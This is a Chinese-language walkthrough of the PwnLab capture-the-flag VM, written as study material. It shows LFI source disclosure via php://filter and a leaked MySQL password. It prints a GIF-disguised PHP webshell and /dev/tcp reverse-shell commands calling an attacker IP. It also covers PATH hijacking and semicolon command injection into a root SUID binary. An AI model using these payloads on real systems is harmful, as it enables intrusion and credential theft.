---
description: PwnLab 靶机从 Web 登录框入手，SQL 注入无果后通过 ?page=login 的本地文件包含配合 PHP 伪协议读取源码，从 config.php 获取 MySQL 凭据并查询 Users.users 表解出用户口令登录后台；随后上传 GIF 图片马并利用文件包含执行拿到 shell，再借助已获取凭据从 kent 切换至 kane，利用 msgmike 中相对命令 cat 进行 PATH 环境变量劫持切换到 mike，最后利用 msg2root 中 /bin/echo %s >> /root/messages.txt 的命令注入获得 root 权限并读取 flag。
---


## 信息收集

主机发现与端口扫描：

```shell
nmap -sn 192.168.56.1/24 --min-rate 1000
IP=192.168.56.117
nmap -A $IP -oN nmap.txt -p `nmap -sS -sU -p- -Pn $IP --min-rate 8888 | grep '/tcp\|/udp' | awk -F '/' '{print $1}' | sort -u | tr '\n' ','`
```

![image-20261110170128446](image-20261110170128446.png)

注意扫描结果中的 3306（MySQL）端口，后面会用到

目录扫描：

- `dirb http://192.168.56.117/`
- `gobuster dir -u "http://192.168.56.117/" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,zip`

> gobuster, Go 语言编写的快速爆破工具
> `dir` 子命令进入目录/文件枚举模式（gobuster 还有 `dns`、`vhost`、`fuzz` 等模式）
> `-x` 对字典中每个单词额外尝试附加这些扩展名。例如字典里有 `backup`，会依次请求 `backup`、`backup.php`、`backup.html`、`backup.zip`

扫到 `index.php`、`config.php`、`login.php`

语言识别：`whatweb http://192.168.56.117` 未标明开发语言，逐一手测：

- `index.html` → Not found
- `index.jsp` → Not found
- `index.php` → 回显正常，判定站点为 PHP

怀疑主页图片 `images/pwnlab.png` 做过隐写检查，但实际看来，并无信息：

```shell
wget http://192.168.56.117/images/pwnlab.png
exiftool pwnlab.png
strings pwnlab.png
```

## 文件包含（LFI）

访问 `/?page=login` 是一个登录框。结合 nmap 扫到的 3306 端口，先尝试 SQL 注入：

- `admin' || '1' like '1`
- `admin' || 1 like 1 --+`

手工注入无果，扔 sqlmap：

1. 把 Burp 的请求包保存到 `req.txt`
2. 报文主体 `user=123&pass=123&submit=Login` 改为 `user=1*&pass=2*&submit=Login`（`*` 标记注入点）
3. `sqlmap -r req.txt --batch --level 5`

仍无果

观察登录页 URL `?page=login`，结合刚扫到的 `login.php`，猜测 `page` 参数存在文件包含，逐一尝试：

- `?page=config`：能访问，但页面空白无回显

![image-20261110185529950](image-20261110185529950.png)

- `?page=config123123`：随便输入一个不存在的文件，仍然空白——无法据此区分文件是否存在

![image-20261110185609625](image-20261110185609625.png)

- `?page=../../../../../etc/passwd`：目录穿越，空白无回显，同上
- `?page=php://filter/read=convert.base64-encode/resource=../../../../../etc/passwd`：PHP 伪协议读绝对路径，空白无回显，同上
- `?page=php://filter/read=convert.base64-encode/resource=index`：伪协议读相对路径，得到 base64 响应

![image-20261110185808296](image-20261110185808296.png)

如法炮制读取 `upload`、`config`，并通过 `echo ... | base64 -d > xxxx.php` 分别还原出 `index.php`、`config.php`、`upload.php` 源码

## 数据库凭据

查看 `config.php`，可以看到数据库的账号密码：

![image-20261110190243518](image-20261110190243518.png)

结合前面扫到的 3306 端口，直接登录：

```shell
mysql -uroot -pH4u%QJ_H99 -h 192.168.56.117
```

在 `Users.users` 表中得到三条 `username:base64(passwd)` 记录：

![image-20261110172206766](image-20261110172206766.png)

复制到 `pass.list` 中，解码并拆分出用户名字典与密码字典：

```shell
# pass.list
cat pass.list | awk '{print $4}'
for i in `cat pass.list | awk '{print $4}'`; do (echo $i | base64 -d;print ); done > pass

# user.list
cat pass.list | awk '{print $2}' > user.list

mv pass pass.list
```

![image-20261110172417305](image-20261110172417305.png)

![image-20261110172458312](image-20261110172458312.png)

## 文件上传 + 文件包含 Getshell

回到 `?page=login`，用 kent 的账号密码完成登录，进入 `?page=upload` 文件上传页面

审计刚还原的源码，在 `index.php` 处发现 include 文件包含点

于是直接上传 GIF 图片马，再利用 `index.php` 进行文件包含：

```php
GIF89a
<?php
    system($_GET[0]);
	phpinfo();
?>
```

包含成功：

> 一句话木马中把 `system($_GET[0])` 和 `phpinfo()` 写在一起
> 图片马被包含成功的同时，也就能直接在 phpinfo 页面搜索 `disable_functions` 确认被禁用的函数，省去二次请求


![image-20261110173110005](image-20261110173110005.png)

搜索 `disable_functions`，查看限制了哪些函数：

![image-20261110173330593](image-20261110173330593.png)

反弹 shell 三次尝试：

1. 通过 `system($_GET[0])` 传参执行 `sh -i >& /dev/tcp/192.168.56.1/2233 0>&1`，没反应

![image-20261110173555779](image-20261110173555779.png)

2. 把图片马中的 `system($_GET[0])` 改为 `exec("sh -i >& /dev/tcp/192.168.56.1/2233 0>&1")`，重新上传，还是没反应

![image-20261110173838390](image-20261110173838390.png)

3. 改用复杂的 PHP Reverse Shell 脚本，反弹成功

![image-20261110174316525](image-20261110174316525.png)

升级 shell 交互体验：

```shell
which python
python -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
```

随后就可以 Tab 补全、也可以按 `Ctrl+C` 了

## 提权

### 信息收集

`cat /etc/passwd | grep home`，查看有 home 目录的用户：

![image-20261110174726383](image-20261110174726383.png)

`find / -perm -u=s -type f 2>/dev/null`，枚举 SUID 文件：

![image-20261110175725052](image-20261110175725052.png)

### exim4 与 procmail（无果）

发现 SUID `exim4`，尝试利用：

1. `/usr/sbin/exim4 --version`

![image-20261110175820673](image-20261110175820673.png)

2. `searchsploit exim 4.8`

![image-20261110175841759](image-20261110175841759.png)

3. `searchsploit exim -m 39549 44571`

中间有一个 py 脚本需要传到靶机执行，用 nc 传文件：

```shell
# kali
nc -lvvp 2233 < 44571.py

# box
cd /tmp
cat < /dev/tcp/192.168.56.1/2233 > 1.py
chmod +x 1.py
python 1.py
```

kent 用户下的 SUID 提权（exim、procmail）均无果，转而利用之前获得的 `username:passwd`，尝试切换其他用户：

![image-20261110181207613](image-20261110181207613.png)

mike 登录不进去，kane 可以

### kane → mike：PATH 环境变量劫持

在 kane 的家目录下，发现 mike 用户、mike 组的 `msgmike` 可执行文件：

![image-20261110181410507](image-20261110181410507.png)

`./msgmike` 尝试执行，报错 `cat: /home/mike/msg.txt: No such file or directory`：

![image-20261110181459848](image-20261110181459848.png)

`strings msgmike` 看一下里面的字符串：

![](image-20261110181638273.png)

可以看到，它以 system 权限执行 `cat /home/mike/msg.txt`——上述报错就是 `/home/mike/msg.txt` 不存在导致的

关键在于 `cat` 只是一个相对命令名，不是绝对路径，可以通过环境变量劫持：

```shell
echo /bin/bash > cat
chmod +x cat
export PATH=.:$PATH   # 把当前目录注册到 $PATH 前面
```

劫持 `cat` 后再执行 `msgmike`，成功切换至 mike 用户：

![image-20261110182033689](image-20261110182033689.png)

### mike → root：msg2root 命令注入

在 mike 的家目录下，发现 root 用户、root 组的 `msg2root` 可执行文件：

![image-20261110182443398](image-20261110182443398.png)

`./msg2root` 执行看看情况：让输入一个消息给 root，随便输入提交后就没别的了

![image-20261110182550298](image-20261110182550298.png)

如法炮制，`strings msg2root` 看看执行了什么命令：

![image-20261110182729181](image-20261110182729181.png)

它用 system 执行了 `/bin/echo %s >> /root/messages.txt`，`%s` 即我们提交的字符串

由于 `/bin/echo` 是绝对路径，无法像刚才那样做环境变量劫持

但命令是一行拼接执行的——刚才提交 `asdasd` 就相当于执行 `/bin/echo asdasd >> /root/messages.txt`

可以用分号形成命令注入点：`/bin/echo asd;id; >> /root/messages.txt`

![image-20261110183047793](image-20261110183047793.png)

实际尝试，理论可行：

![image-20261110183126693](image-20261110183126693.png)

注入命令拿到 root：

![alt](image-20261110183232420.png)

## Flag

![image-20261110180728981](image-20261110180728981.png)